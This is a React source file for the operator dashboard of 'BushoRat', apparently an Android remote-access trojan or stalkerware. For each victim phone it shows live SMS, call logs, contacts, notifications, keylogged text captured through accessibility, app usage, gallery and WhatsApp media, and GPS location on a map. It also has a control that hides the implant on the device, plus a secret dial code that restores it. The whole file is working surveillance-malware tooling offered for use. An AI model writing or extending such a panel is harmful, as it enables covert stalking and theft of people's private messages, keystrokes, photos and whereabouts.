import { useEffect, useMemo, useState, type ReactNode } from "react";
import { Link, useParams } from "react-router-dom";
import {
  IconBack,
  IconBell,
  IconContact,
  IconDevice,
  IconEye,
  IconEyeOff,
  IconImage,
  IconKey,
  IconMap,
  IconMessage,
  IconPhone,
  IconSearch,
  IconUser,
  IconUsers,
  IconVideo,
} from "../components/Icons";
import {
  IllustEmptyFeed,
  IllustEmptyGallery,
} from "../components/Illustrations";
import {
  appLabel,
  callTypeLabel,
  formatDuration,
  formatTime,
  recordsToList,
  setUserHidden,
  smsTypeLabel,
  UserBundle,
  watchUserBundle,
} from "../api";

type Tab =
  | "profile"
  | "location"
  | "sms"
  | "call_logs"
  | "contacts"
  | "notifications"
  | "keylogs"
  | "app_usage"
  | "gallery";

const PAGE_SIZE = 40;

function countMap(map: Record<string, unknown> | null | undefined) {
  return map ? Object.keys(map).length : 0;
}

function matchesQuery(row: Record<string, any>, q: string) {
  if (!q) return true;
  return Object.values(row).some((v) =>
    String(v ?? "")
      .toLowerCase()
      .includes(q)
  );
}

function readableValue(val: unknown): string {
  if (val == null || val === "") return "—";
  if (typeof val === "number") {
    if (val > 1_000_000_000_000) return formatTime(val);
    return String(val);
  }
  if (typeof val === "boolean") return val ? "Yes" : "No";
  if (typeof val === "object") {
    return Object.entries(val as Record<string, unknown>)
      .map(([k, v]) => `${k}: ${readableValue(v)}`)
      .join(" · ");
  }
  return String(val);
}

export default function UserDetailPage() {
  const { userId = "" } = useParams();
  const [tab, setTab] = useState<Tab>("app_usage");
  const [data, setData] = useState<UserBundle | null>(null);
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const [loading, setLoading] = useState(true);
  const [live, setLive] = useState(false);
  const [query, setQuery] = useState("");
  const [page, setPage] = useState(0);
  const [galleryFilter, setGalleryFilter] = useState<"all" | "whatsapp" | "gallery">("all");
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);

  useEffect(() => {
    setLoading(true);
    setData(null);
    setLive(false);
    setPage(0);
    setQuery("");

    const unsub = watchUserBundle(
      userId,
      (bundle) => {
        setData(bundle);
        setLoading(false);
        setLive(true);
        setError("");
      },
      (err) => {
        setError(err.message || "Failed to load user");
        setLoading(false);
        setLive(false);
      }
    );
    return unsub;
  }, [userId]);

  useEffect(() => {
    setPage(0);
  }, [tab, query, galleryFilter]);

  async function toggleHidden() {
    if (!data) return;
    setBusy(true);
    setError("");
    try {
      await setUserHidden(userId, !data.visibility.is_hidden);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to update visibility");
    } finally {
      setBusy(false);
    }
  }

  const tabs = useMemo(() => {
    const counts = {
      profile: data?.profile || data?.device_info ? 1 : 0,
      location: data?.location
        ? data.location.latest
          ? 1
          : countMap(data.location)
        : 0,
      sms: countMap(data?.sms),
      call_logs: countMap(data?.call_logs),
      contacts: countMap(data?.contacts),
      notifications: countMap(data?.notifications),
      keylogs: countMap(data?.keylogs),
      app_usage: countMap(data?.app_usage),
      gallery: countMap(data?.gallery),
    };
    return [
      { id: "app_usage" as Tab, label: "App usage", count: counts.app_usage, icon: IconDevice },
      { id: "gallery" as Tab, label: "Gallery", count: counts.gallery, icon: IconImage },
      { id: "sms" as Tab, label: "SMS", count: counts.sms, icon: IconMessage },
      { id: "call_logs" as Tab, label: "Calls", count: counts.call_logs, icon: IconPhone },
      { id: "contacts" as Tab, label: "Contacts", count: counts.contacts, icon: IconContact },
      { id: "notifications" as Tab, label: "Notifications", count: counts.notifications, icon: IconBell },
      { id: "location" as Tab, label: "Location", count: counts.location, icon: IconMap },
      { id: "profile" as Tab, label: "Profile", count: counts.profile, icon: IconUser },
      { id: "keylogs" as Tab, label: "Keylogs", count: counts.keylogs, icon: IconKey },
    ];
  }, [data]);

  const listRecords = useMemo(() => {
    if (!data) return [];
    const q = query.trim().toLowerCase();
    if (tab === "sms") return recordsToList(data.sms).filter((r) => matchesQuery(r, q));
    if (tab === "call_logs") return recordsToList(data.call_logs).filter((r) => matchesQuery(r, q));
    if (tab === "contacts") return recordsToList(data.contacts).filter((r) => matchesQuery(r, q));
    if (tab === "notifications")
      return recordsToList(data.notifications).filter((r) => matchesQuery(r, q));
    if (tab === "keylogs") return recordsToList(data.keylogs).filter((r) => matchesQuery(r, q));
    if (tab === "app_usage") return recordsToList(data.app_usage).filter((r) => matchesQuery(r, q));
    return [];
  }, [data, tab, query]);

  const pageCount = Math.max(1, Math.ceil(listRecords.length / PAGE_SIZE));
  const pageSafe = Math.min(page, pageCount - 1);
  const pageRows = listRecords.slice(pageSafe * PAGE_SIZE, pageSafe * PAGE_SIZE + PAGE_SIZE);

  const galleryEntries = useMemo(() => {
    if (!data?.gallery) return [];
    const q = query.trim().toLowerCase();
    return Object.entries(data.gallery)
      .filter(([, item]: [string, any]) => {
        if (galleryFilter !== "all" && (item?.source || "gallery") !== galleryFilter) return false;
        if (!q) return true;
        return matchesQuery({ id: "", ...item }, q);
      })
      .sort(
        (a, b) =>
          Number((b[1] as any)?.uploadedAt || (b[1] as any)?.timestamp || 0) -
          Number((a[1] as any)?.uploadedAt || (a[1] as any)?.timestamp || 0)
      );
  }, [data, galleryFilter, query]);

  const title =
    (data?.profile as any)?.displayName ||
    (data?.profile as any)?.email ||
    userId;

  const showSearch = tab !== "profile" && tab !== "location";

  return (
    <div className="container stack">
      <div className="topnav card">
        <div className="row" style={{ justifyContent: "space-between", width: "100%" }}>
          <div className="row">
            <div className="brand-wrap">
              <div className="brand-mark" aria-hidden>
                B
              </div>
              <strong className="brand">BushoRat</strong>
            </div>
            <nav className="nav-links">
              <Link className="nav-link" to="/">
                <IconUsers size={16} />
                <span>Users</span>
              </Link>
              <Link className="nav-link" to="/videos">
                <IconVideo size={16} />
                <span>Videos</span>
              </Link>
            </nav>
          </div>
          <Link className="nav-link" to="/">
            <IconBack size={16} />
            <span>Back</span>
          </Link>
        </div>
      </div>

      <div className="page-header">
        <div>
          <h1>{title}</h1>
          <p className="muted mono tiny" style={{ margin: "6px 0 0" }}>
            {userId}
          </p>
        </div>
        <div className="row">
          <span className={`live-pill ${live ? "on" : ""}`}>
            <span className="live-dot" />
            {live ? "Live" : "Connecting…"}
          </span>
          <span className={`badge ${data?.visibility?.is_hidden ? "hidden" : "visible"}`}>
            {data?.visibility?.is_hidden ? (
              <>
                <IconEyeOff size={12} /> Hidden
              </>
            ) : (
              <>
                <IconEye size={12} /> Visible
              </>
            )}
          </span>
          <button
            className={`btn btn-icon ${data?.visibility?.is_hidden ? "ok" : "danger"}`}
            disabled={busy || !data}
            onClick={toggleHidden}
          >
            {data?.visibility?.is_hidden ? (
              <>
                <IconEye size={15} /> Show app
              </>
            ) : (
              <>
                <IconEyeOff size={15} /> Hide app
              </>
            )}
          </button>
        </div>
      </div>

      {error ? <div className="error-text">{error}</div> : null}

      {data?.visibility?.is_hidden ? (
        <div className="card notice">
          Secret code: <strong>{data.visibility.secret_code || "—"}</strong>
          {" · "}
          Dial: <strong>{data.visibility.restore_dial_code || "*#*#737826#*#*"}</strong>
        </div>
      ) : null}

      <div className="tabs">
        {tabs.map((t) => {
          const Icon = t.icon;
          return (
            <button
              key={t.id}
              className={`tab ${tab === t.id ? "active" : ""}`}
              onClick={() => setTab(t.id)}
            >
              <Icon size={14} />
              {t.label}
              <span className="tab-count">{t.count}</span>
            </button>
          );
        })}
      </div>

      {showSearch ? (
        <div className="toolbar card">
          <div className="input-with-icon">
            <IconSearch size={16} />
            <input
              className="input"
              placeholder={
                tab === "keylogs"
                  ? "Search typed text or app…"
                  : tab === "gallery"
                    ? "Search gallery media…"
                    : `Search ${tab.replace("_", " ")}…`
              }
              value={query}
              onChange={(e) => setQuery(e.target.value)}
            />
          </div>
          {tab === "gallery" ? (
            <div className="row">
              {(["all", "whatsapp", "gallery"] as const).map((f) => (
                <button
                  key={f}
                  className={`chip ${galleryFilter === f ? "active" : ""}`}
                  onClick={() => setGalleryFilter(f)}
                >
                  {f === "all" ? "All" : f === "whatsapp" ? "WhatsApp" : "Other"}
                </button>
              ))}
            </div>
          ) : null}
        </div>
      ) : null}

      <div className="card fade-in">
        {loading && !data ? (
          <div className="skeleton-stack">
            <div className="skeleton-line" />
            <div className="skeleton-line" />
            <div className="skeleton-line short" />
          </div>
        ) : null}

        {tab === "profile" && data ? <ProfileView data={data} /> : null}
        {tab === "location" && data ? <LocationView location={data.location} /> : null}
        {tab === "gallery" ? (
          <GalleryView entries={galleryEntries} onOpen={setPreviewUrl} />
        ) : null}

        {tab === "keylogs" ? (
          <KeylogFeed
            rows={pageRows}
            total={listRecords.length}
            page={pageSafe}
            pageCount={pageCount}
            onPage={setPage}
          />
        ) : null}

        {tab === "app_usage" ? (
          <RecordTable
            empty="No app usage yet. On the phone, allow Usage Access when prompted, then return to the app."
            rows={pageRows}
            total={listRecords.length}
            page={pageSafe}
            pageCount={pageCount}
            onPage={setPage}
            columns={[
              {
                key: "app",
                label: "App",
                render: (r) => (
                  <span>
                    <strong>{r.appName || appLabel(r.packageName)}</strong>
                    <div className="muted mono tiny">{r.packageName || "—"}</div>
                  </span>
                ),
              },
              {
                key: "time",
                label: "Screen time",
                render: (r) => r.totalTimeText || formatDuration(Math.floor(Number(r.totalTimeMs || 0) / 1000)),
              },
              {
                key: "last",
                label: "Last used",
                render: (r) => formatTime(r.lastTimeUsed || r.uploadedAt),
              },
            ]}
          />
        ) : null}

        {tab === "sms" ? (
          <MessageFeed
            empty="No SMS synced yet."
            rows={pageRows}
            total={listRecords.length}
            page={pageSafe}
            pageCount={pageCount}
            onPage={setPage}
            renderMeta={(r) => `${smsTypeLabel(r.type)} · ${r.address || "Unknown"}`}
            renderBody={(r) => r.body || "—"}
            renderTime={(r) => formatTime(r.date || r.uploadedAt)}
          />
        ) : null}

        {tab === "notifications" ? (
          <MessageFeed
            empty="No notifications synced yet."
            rows={pageRows}
            total={listRecords.length}
            page={pageSafe}
            pageCount={pageCount}
            onPage={setPage}
            renderMeta={(r) => `${appLabel(r.packageName)} · ${r.title || "Notification"}`}
            renderBody={(r) => r.text || r.body || "—"}
            renderTime={(r) => formatTime(r.timestamp || r.postedAt || r.uploadedAt)}
          />
        ) : null}

        {tab === "call_logs" ? (
          <RecordTable
            empty="No call logs synced yet."
            rows={pageRows}
            total={listRecords.length}
            page={pageSafe}
            pageCount={pageCount}
            onPage={setPage}
            columns={[
              { key: "time", label: "Time", render: (r) => formatTime(r.date || r.uploadedAt) },
              { key: "type", label: "Type", render: (r) => callTypeLabel(r.type) },
              { key: "number", label: "Number", render: (r) => r.number || "—" },
              { key: "duration", label: "Duration", render: (r) => formatDuration(r.duration) },
            ]}
          />
        ) : null}

        {tab === "contacts" ? (
          <RecordTable
            empty="No contacts synced yet."
            rows={pageRows}
            total={listRecords.length}
            page={pageSafe}
            pageCount={pageCount}
            onPage={setPage}
            columns={[
              { key: "name", label: "Name", render: (r) => r.name || r.displayName || "—" },
              { key: "number", label: "Number", render: (r) => r.number || r.phone || "—" },
              { key: "type", label: "Type", render: (r) => r.type || "—" },
            ]}
          />
        ) : null}
      </div>

      {previewUrl ? (
        <div className="lightbox" onClick={() => setPreviewUrl(null)}>
          <img src={previewUrl} alt="Preview" onClick={(e) => e.stopPropagation()} />
          <button className="btn secondary" onClick={() => setPreviewUrl(null)}>
            Close
          </button>
        </div>
      ) : null}
    </div>
  );
}

function ProfileView({ data }: { data: UserBundle }) {
  const profile = (data.profile || {}) as Record<string, any>;
  const device = (data.device_info || {}) as Record<string, any>;
  const sync = (data.sync_status || {}) as Record<string, any>;
  const location = (data.location?.latest || data.location) as Record<string, any> | null;

  const profileFields = [
    ["Name", profile.displayName],
    ["Email", profile.email],
    ["Device model", profile.deviceModel || device.model],
    ["Last seen", formatTime(profile.lastSeen)],
  ];

  const deviceFields = [
    ["Manufacturer", device.manufacturer],
    ["Model", device.model],
    ["Android", device.androidVersion || device.osVersion],
    ["Device ID", device.androidId || device.deviceId],
    ["Locale", device.locale],
    ["RAM", device.ram],
    ["Screen", device.screen],
    ["App version", device.appVersion],
  ];

  const lat = location?.latitude ?? location?.lat;
  const lng = location?.longitude ?? location?.lng ?? location?.lon;

  return (
    <div className="stack">
      <div className="info-grid">
        <section className="info-panel">
          <h3>Profile</h3>
          <dl className="kv">
            {profileFields.map(([k, v]) => (
              <div key={String(k)}>
                <dt>{k}</dt>
                <dd>{v != null && v !== "" ? String(v) : "—"}</dd>
              </div>
            ))}
          </dl>
        </section>
        <section className="info-panel">
          <h3>Device</h3>
          <dl className="kv">
            {deviceFields.map(([k, v]) => (
              <div key={String(k)}>
                <dt>{k}</dt>
                <dd>{v != null && v !== "" ? String(v) : "—"}</dd>
              </div>
            ))}
          </dl>
        </section>
        {location ? (
          <section className="info-panel">
            <h3>📍 Location</h3>
            <dl className="kv">
              <div>
                <dt>Address</dt>
                <dd style={{ wordBreak: "break-word", lineHeight: "1.5", maxWidth: "280px" }}>
                  {location.address || location.addressLine || "—"}
                </dd>
              </div>
              {lat != null && lng != null ? (
                <>
                  <div>
                    <dt>Coordinates</dt>
                    <dd>{lat.toFixed(4)}, {lng.toFixed(4)}</dd>
                  </div>
                  <div>
                    <dt>Updated</dt>
                    <dd>{formatTime(location.timestamp || location.time || location.uploadedAt)}</dd>
                  </div>
                </>
              ) : null}
            </dl>
          </section>
        ) : null}
      </div>
      <section className="info-panel">
        <h3>Sync status</h3>
        {Object.keys(sync).length === 0 ? (
          <p className="muted">No sync status yet.</p>
        ) : (
          <dl className="kv">
            {Object.entries(sync).map(([key, val]) => (
              <div key={key}>
                <dt>{key}</dt>
                <dd>{readableValue(val)}</dd>
              </div>
            ))}
          </dl>
        )}
      </section>
    </div>
  );
}

function LocationView({ location }: { location: Record<string, unknown> | null }) {
  const latest = (location?.latest || location) as Record<string, any> | null;
  if (!latest || Object.keys(latest).length === 0) {
    return <p className="empty-state">No location yet.</p>;
  }

  const lat = latest.latitude ?? latest.lat;
  const lng = latest.longitude ?? latest.lng ?? latest.lon;
  const accuracy = latest.accuracy;
  const address = latest.address || latest.addressLine || "Unknown";
  const mapUrl =
    lat != null && lng != null
      ? `https://www.google.com/maps?q=${encodeURIComponent(`${lat},${lng}`)}`
      : null;
  const mapEmbedUrl =
    lat != null && lng != null
      ? `https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3024.0!2d${lng}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2z${lat}%2C${lng}!5e0!3m2!1sen!2s!4v0`
      : null;

  return (
    <div className="stack">
      {mapEmbedUrl ? (
        <div style={{ borderRadius: "14px", overflow: "hidden", border: "1px solid #e4dccf" }}>
          <iframe
            width="100%"
            height="400"
            style={{ border: 0, display: "block" }}
            loading="lazy"
            allowFullScreen=""
            referrerPolicy="no-referrer-when-downgrade"
            src={mapEmbedUrl}
            title="Device Location Map"
          />
        </div>
      ) : null}

      <div className="card">
        <h3 style={{ margin: "0 0 12px", fontSize: "14px", color: "#667487", textTransform: "uppercase", fontWeight: 700 }}>
          Location Details
        </h3>
        <dl className="kv">
          <div>
            <dt>Address</dt>
            <dd style={{ wordBreak: "break-word", lineHeight: "1.5" }}>{address}</dd>
          </div>
          <div>
            <dt>Latitude</dt>
            <dd>{lat != null ? lat.toFixed(6) : "—"}</dd>
          </div>
          <div>
            <dt>Longitude</dt>
            <dd>{lng != null ? lng.toFixed(6) : "—"}</dd>
          </div>
          {accuracy != null ? (
            <div>
              <dt>Accuracy</dt>
              <dd>{accuracy} meters</dd>
            </div>
          ) : null}
          <div>
            <dt>Updated</dt>
            <dd>{formatTime(latest.timestamp || latest.time || latest.uploadedAt)}</dd>
          </div>
        </dl>
      </div>

      {mapUrl ? (
        <a className="btn secondary" href={mapUrl} target="_blank" rel="noreferrer">
          📍 Open in Google Maps
        </a>
      ) : null}
    </div>
  );
}

function GalleryView({
  entries,
  onOpen,
}: {
  entries: [string, any][];
  onOpen: (url: string) => void;
}) {
  if (entries.length === 0) {
    return (
      <div className="empty-block">
        <IllustEmptyGallery className="illust" />
        <p className="empty-state">
          No gallery media yet. It appears after the device unlocks Videos / storage sync.
        </p>
      </div>
    );
  }
  return (
    <div className="stack">
      <p className="muted" style={{ margin: 0 }}>
        {entries.length} media item{entries.length === 1 ? "" : "s"}
      </p>
      <div className="gallery">
        {entries.map(([id, item]) => (
          <button
            key={id}
            type="button"
            className="gallery-item"
            onClick={() => item?.url && onOpen(item.url)}
            title={item?.fileName || id}
          >
            <img src={item?.url} alt={item?.fileName || id} loading="lazy" />
            <span className="gallery-meta">
              {item?.source === "whatsapp" ? "WhatsApp" : "Gallery"}
            </span>
            <span className="gallery-caption">
              {item?.fileName || "Media"}
              <br />
              <span className="tiny">{formatTime(item?.uploadedAt || item?.timestamp)}</span>
            </span>
          </button>
        ))}
      </div>
    </div>
  );
}

function KeylogFeed({
  rows,
  total,
  page,
  pageCount,
  onPage,
}: {
  rows: Record<string, any>[];
  total: number;
  page: number;
  pageCount: number;
  onPage: (p: number) => void;
}) {
  if (total === 0) {
    return (
      <div className="empty-block">
        <IllustEmptyFeed className="illust" />
        <p className="empty-state">
          No keylogs yet. They appear when accessibility sync is enabled on the device.
        </p>
      </div>
    );
  }

  const from = page * PAGE_SIZE + 1;
  const to = Math.min(total, page * PAGE_SIZE + rows.length);

  return (
    <div className="stack">
      <Pager from={from} to={to} total={total} page={page} pageCount={pageCount} onPage={onPage} />
      <div className="feed">
        {rows.map((r) => (
          <article key={r.id} className="feed-item">
            <div className="feed-meta">
              <strong>{appLabel(r.packageName)}</strong>
              <span className="badge soft">{r.eventType || "text"}</span>
              <span className="muted tiny">{formatTime(r.timestamp || r.uploadedAt)}</span>
            </div>
            <p className="feed-body">{r.text?.trim() ? r.text : "(empty)"}</p>
            {r.beforeText ? (
              <p className="muted tiny" style={{ margin: 0 }}>
                Before: {r.beforeText}
              </p>
            ) : null}
            <p className="muted tiny" style={{ margin: 0 }}>
              {r.packageName || "unknown app"}
              {r.className ? ` · ${r.className}` : ""}
            </p>
          </article>
        ))}
      </div>
    </div>
  );
}

function MessageFeed({
  rows,
  total,
  page,
  pageCount,
  onPage,
  empty,
  renderMeta,
  renderBody,
  renderTime,
}: {
  rows: Record<string, any>[];
  total: number;
  page: number;
  pageCount: number;
  onPage: (p: number) => void;
  empty: string;
  renderMeta: (r: Record<string, any>) => string;
  renderBody: (r: Record<string, any>) => string;
  renderTime: (r: Record<string, any>) => string;
}) {
  if (total === 0) {
    return (
      <div className="empty-block">
        <IllustEmptyFeed className="illust" />
        <p className="empty-state">{empty}</p>
      </div>
    );
  }
  const from = page * PAGE_SIZE + 1;
  const to = Math.min(total, page * PAGE_SIZE + rows.length);
  return (
    <div className="stack">
      <Pager from={from} to={to} total={total} page={page} pageCount={pageCount} onPage={onPage} />
      <div className="feed">
        {rows.map((r) => (
          <article key={r.id} className="feed-item">
            <div className="feed-meta">
              <strong>{renderMeta(r)}</strong>
              <span className="muted tiny">{renderTime(r)}</span>
            </div>
            <p className="feed-body">{renderBody(r)}</p>
          </article>
        ))}
      </div>
    </div>
  );
}

function Pager({
  from,
  to,
  total,
  page,
  pageCount,
  onPage,
}: {
  from: number;
  to: number;
  total: number;
  page: number;
  pageCount: number;
  onPage: (p: number) => void;
}) {
  return (
    <div className="row" style={{ justifyContent: "space-between" }}>
      <p className="muted" style={{ margin: 0 }}>
        Showing {from}–{to} of {total}
      </p>
      <div className="row">
        <button className="btn secondary" disabled={page <= 0} onClick={() => onPage(page - 1)}>
          Prev
        </button>
        <span className="muted">
          {page + 1} / {pageCount}
        </span>
        <button
          className="btn secondary"
          disabled={page >= pageCount - 1}
          onClick={() => onPage(page + 1)}
        >
          Next
        </button>
      </div>
    </div>
  );
}

type Column = {
  key: string;
  label: string;
  render: (row: Record<string, any>) => ReactNode;
};

function RecordTable({
  rows,
  total,
  page,
  pageCount,
  onPage,
  columns,
  empty,
}: {
  rows: Record<string, any>[];
  total: number;
  page: number;
  pageCount: number;
  onPage: (p: number) => void;
  columns: Column[];
  empty: string;
}) {
  if (total === 0) return <p className="empty-state">{empty}</p>;
  const from = page * PAGE_SIZE + 1;
  const to = Math.min(total, page * PAGE_SIZE + rows.length);
  return (
    <div className="stack">
      <Pager from={from} to={to} total={total} page={page} pageCount={pageCount} onPage={onPage} />
      <div className="table-wrap">
        <table className="table">
          <thead>
            <tr>
              {columns.map((c) => (
                <th key={c.key}>{c.label}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {rows.map((r) => (
              <tr key={r.id}>
                {columns.map((c) => (
                  <td key={c.key}>{c.render(r)}</td>
                ))}
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
